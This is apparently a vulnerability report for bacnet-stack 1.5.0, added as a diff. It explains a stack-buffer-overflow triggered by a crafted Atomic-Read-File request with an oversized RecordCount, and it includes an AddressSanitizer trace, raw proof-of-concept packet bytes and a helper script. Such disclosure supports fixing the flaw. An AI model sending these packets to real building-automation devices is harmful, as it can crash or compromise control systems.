@@ -1,0 +1,23 @@
+issue #1339
+
+Summary
+
+I found a reproducible stack-based out-of-bounds write / stack-buffer-overflow in bacnet-stack 1.5.0 when the server processes a malicious Atomic-Read-File request in record access mode.
+
+The bug is triggered on the real server side. A crafted request can set an excessively large RecordCount, which is later used as the loop bound for writing record data into a stack-allocated BACNET_ATOMIC_READ_FILE_DATA data structure. However, the stack object only has space for one fileData element. When the loop reaches i = 1, the code computes &data->fileData[1], which is already out of bounds, and the resulting invalid pointer is passed down to memmove(), causing a stack-buffer-overflow.
+
+Actual behavior if applicable
+
+==2466==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x71976ea03e10 at pc 0x63e1e650e7c9 bp 0x7ffcc6af8410 sp 0x7ffcc6af7bd0
+
+PoC
+
+<81><0b><00><19><01><20><ff><ff><00><ff><10><00><c4><02><00><00><7b><22><05><c4><91><00><22><01><04>
+<81><0a><01><08><01><04><01><05><3c><06><c4><02><80><00><02><1e><33><00><00><00><22><06><01><1f><32><38><38><38><34><34><34><23><1b><01><1a><01><bf><20><18><bf><20><01><34><32><34><8f><25><01><01><00>
+
+the simple program to create backup_1.bin:
+
+python3 - <<'PY'
+with open("backup_1.bin", "wb") as f:
+    f.write(b"A" * 4096)
+PY
